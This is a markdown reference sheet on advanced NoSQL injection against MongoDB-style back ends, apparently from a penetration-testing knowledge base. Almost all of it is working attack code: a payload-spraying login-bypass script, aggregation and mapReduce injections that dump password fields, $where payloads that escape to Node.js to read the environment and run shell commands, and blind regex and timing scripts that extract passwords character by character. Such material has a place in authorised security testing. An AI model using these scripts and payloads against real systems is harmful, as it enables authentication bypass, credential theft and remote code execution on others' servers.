# NoSQL Injection — Advanced

Per-technique scenarios in `scenarios/nosql/`. This file: dense reference for automation, aggregation, type confusion, and blind extraction.

## Automated detection script

```python
import requests, json
def test_nosqli(url, ct="json", cookies=None):
    """Spray operator/syntax payloads and compare to baseline."""
    results = []
    json_payloads = [
        ("$ne bypass", {"username":"admin","password":{"$ne":""}}),
        ("$gt bypass", {"username":"admin","password":{"$gt":""}}),
        ("$regex wildcard", {"username":"admin","password":{"$regex":".*"}}),
        ("$regex prefix", {"username":{"$regex":"^admin"},"password":{"$ne":""}}),
        ("$exists", {"username":"admin","password":{"$exists":True}}),
        ("$in bypass", {"username":"admin","password":{"$in":["","password","admin","123456"]}}),
        ("$where true", {"username":"admin","$where":"1==1"}),
        ("$or bypass", {"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$ne":""}}),
    ]
    form_payloads = [
        ("URL $ne", {"username":"admin","password[$ne]":""}),
        ("URL $regex", {"username":"admin","password[$regex]":".*"}),
        ("URL $exists", {"username":"admin","password[$exists]":"true"}),
        ("URL $or", {"$or[0][username]":"admin","$or[1][username]":"administrator","password[$ne]":""}),
    ]
    baseline = requests.post(url, json={"username":"admin","password":"x"}, timeout=10).text
    for name, p in json_payloads:
        r = requests.post(url, json=p, timeout=10)
        if r.status_code in [200,302] and len(r.text) > len(baseline) + 50:
            results.append(f"[JSON] {name}: HTTP {r.status_code}")
    for name, p in form_payloads:
        r = requests.post(url, data=p, timeout=10)
        if r.status_code in [200,302] and len(r.text) > len(baseline) + 50:
            results.append(f"[FORM] {name}: HTTP {r.status_code}")
    return results
```

## Aggregation pipeline injection

### `$lookup` cross-collection access

```json
[{"$lookup": {
    "from": "users",
    "localField": "_id",
    "foreignField": "_id",
    "as": "stolen_data"
}}]
```

### `$match` injection

```json
[{"$match": {"category": {"$ne": null}}}]                    # all rows
[{"$match": {}}, {"$group": {"_id": "$category", "count": {"$sum": 1}}}]  # enumerate
```

### `$addFields` data leak

```json
[{"$addFields": {"leaked_field": "$password"}}]
```

See `scenarios/nosql/mongo-aggregation-pipeline.md` for full coverage.

## mapReduce / SSJS

### `$where` JavaScript

```json
{"$where": "1==1"}
{"$where": "this.password.length > 0"}
{"$where": "sleep(5000)"}
{"$where": "if (this.password[0] == 'a') { sleep(5000); } return true;"}
```

### mapReduce command injection

```javascript
db.runCommand({
    mapReduce: "users",
    map: function() { emit(this._id, this.password); },
    reduce: function(key, values) { return values.join(','); },
    out: "exfiltrated"
});
db.exfiltrated.find();
```

### Server-side JS RCE

```json
{"$where": "this.constructor.constructor('return process.env')()"}
{"$where": "this.constructor.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()"}
```

Escapes JS sandbox via `Function` constructor — works when JS context shares globals with Node.js host.

## JSON/BSON type confusion

### URL-encoded → object coercion

```
username=admin&password[$ne]=
# Parsed as: {"username":"admin","password":{"$ne":""}}
```

### Array injection

```
username=admin&password[$in][]=password1&password[$in][]=password2
# Parsed as: {"username":"admin","password":{"$in":["password1","password2"]}}
```

### Content-type switching

```bash
# Same target, two parsers
curl -X POST /login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":""}}'
curl -X POST /login -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password[$ne]='
```

### Integer / boolean

```json
{"username":"admin","password":true}
{"username":"admin","password":1}
{"username":{"$eq":"admin"},"password":{"$ne":null}}
```

## Blind extraction (regex-based)

```python
import requests, string, re

def extract_field(url, known_user, field="password"):
    extracted = ""
    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_{}-!@#$%^&*"
    for pos in range(64):
        found = False
        for c in charset:
            esc = extracted + (re.escape(c) if c in r'\.^$*+?{}[]|()' else c)
            payload = {"username":known_user, field:{"$regex":f"^{esc}"}}
            r = requests.post(url, json=payload, timeout=10, allow_redirects=False)
            if r.status_code == 200 or (r.status_code == 302 and "login" not in r.headers.get("Location","")):
                extracted += c
                found = True
                break
        if not found:
            break
    return extracted
```

## Username enumeration / timing extraction

```python
# $regex username enum
def check(prefix):
    return requests.post(url, json={"username":{"$regex":f"^{prefix}"},"password":{"$ne":""}}).status_code in (200,302)
# Iterate through chars + extend prefix

# $where timing-based extraction
def extract_via_timing(url, field="password"):
    extracted = ""
    for pos in range(64):
        for c in string.printable.strip():
            payload = {"username":"admin","$where":f"if(this.{field}[{pos}]=='{c}'){{sleep(2000);return true;}}return false;"}
            start = time.time()
            try: requests.post(url, json=payload, timeout=5)
            except: pass
            if time.time() - start >= 1.5:
                extracted += c
                break
        else: break
    return extracted
```

## References

`scenarios/nosql/`, `nosql-injection-quickstart.md`, `nosql-injection-resources.md`.
